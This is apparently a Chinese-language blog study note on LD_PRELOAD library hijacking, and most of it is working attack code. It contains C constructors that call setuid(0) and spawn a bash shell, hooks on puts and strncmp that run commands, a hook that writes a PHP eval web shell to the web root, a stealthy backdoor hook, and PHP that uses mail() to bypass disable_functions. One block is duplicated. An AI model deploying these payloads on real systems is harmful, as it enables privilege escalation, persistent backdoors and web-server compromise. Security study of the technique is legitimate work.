---
title: "LD_PRELOAD劫持"
pubDatetime: 2025-01-20T21:06:41.000+08:00
description: "LD_PRELOAD 动态链接库劫持触发条件与利用方式"
tags: ["others"]
---
[学习文章](https://luokuang1.github.io/2024/08/16/%E6%B5%85%E8%B0%88LD-PRELOAD%E5%8A%AB%E6%8C%81/)

用命令`readelf -Ws /usr/bin/ls`看linux命令中执行了调用了哪些函数,然后再劫持这些函数

可能实现中有,但是执行时没用到, 所以多劫持几个试试

`ls` --> `strncmp`
`whoami` --> `puts`

`man 1/2/3 strncmp` 可以看到函数定义

编译 `gcc -shared -fPIC -o test.so test.c`

## .so 文件加载触发
```c
#include <stdlib.h>
#include <stdio.h>
#include <string.h>
 
__attribute__ ((__constructor__)) void preload (void){
    unsetenv("LD_PRELOAD");
    setuid(0);
    setgid(0);
    system("/bin/bash -i");
}
```

## .so 文件加载触发
```c
#include <stdlib.h>
#include <stdio.h>
#include <string.h>
 
__attribute__ ((__constructor__)) void preload (void){
    unsetenv("LD_PRELOAD");
    setuid(0);
    setgid(0);
    system("/bin/bash -i");
}
```

## 防止无穷递归
```c
int strncmp(const char *s1, const char *s2, size_t n){
    if(getenv("LD_PRELOAD") == NULL){
        return 0;
    }
    unsetenv("LD_PRELOAD");
    system("ls");
    return 0;
}
```


## 奇怪的错误

报segmentation fault
```c
#include <stdio.h>
#include <stdlib.h>

int puts(const char *message) {
    system("/bin/bash -i ...")
    printf("hacked!!!");  // printf("hacked!!!\n"); 报错!!
    return 0;
}
// ----------- or -----
#include <stdio.h>
#include <stdlib.h>

int puts(const char *message) {
  printf("hack you!!!");
  system("echo '<?php @eval($_POST[0]);?>' > /var/www/html/gxngxngxn.php");
  return 0;
}
```

去掉`\n`后又可以了
(神奇的gpt告诉我是因为printf中调用了puts, 所以递归爆栈了, \n与刷新缓冲区有关... 管他呢)

getenv也会调用puts,所以用上面的方法也不行

可以用static int flag作为标记,防止递归调用, 见下例


## 隐匿后门

```c
#include <dlfcn.h>
#include <stdio.h>
#define _GNU_SOURCE

int puts(const char *s) {
    int (*original_puts)(const char *) = dlsym(RTLD_NEXT, "puts");
    int result = original_puts(s);
    static int in_hook = 0;
    if (in_hook) { // 防止递归调用
        return result;
    }
    in_hook = 1;
    printf("puts hooked!\n");
    system("ls");
    in_hook = 0;
    return result;
}
```

可以使得原来的命令正常执行,用于后门隐匿

## 突破disable_function
disable_function只在当前进程生效
mail 或 error_log, ImageMagick函数产生一个新进程, 并执行了getuid函数
劫持getuid函数 或 采用加载触发即可
```php
<?php

putenv("LD_PRELOAD=/var/www/html/test.so");
mail('','','','');
// error_log('',1)
// mb_send_mail('','','')
// imap_mail("1@a.com","0","1","2","3")
```

### 使用GCONV_PATH与iconv进行bypass disable_functions
这个同样可以bypass
https://xz.aliyun.com/news/8262
